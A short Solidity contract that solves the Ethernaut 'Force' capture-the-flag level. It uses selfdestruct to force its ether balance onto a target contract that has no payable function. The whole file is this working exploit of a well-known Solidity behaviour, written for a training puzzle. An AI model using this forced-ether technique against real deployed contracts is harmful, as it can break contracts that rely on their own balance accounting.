//SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract ForceExploit {
    address public implementation;

    /// @notice Constructor called at deployment of contract
    /// @param _implementation contract address of ethernaut `Force` challenge
    /// Note: https://ethernaut.openzeppelin.com/level/0x46f79002907a025599f355A04A512A6Fd45E671B
    constructor(address _implementation) payable {
        require(msg.value > 0);
        implementation = _implementation;
    }

    /// @notice Send balance to `Force` contract by destructing contractf
    function exploit() external {
        selfdestruct(payable(implementation));
    }
}
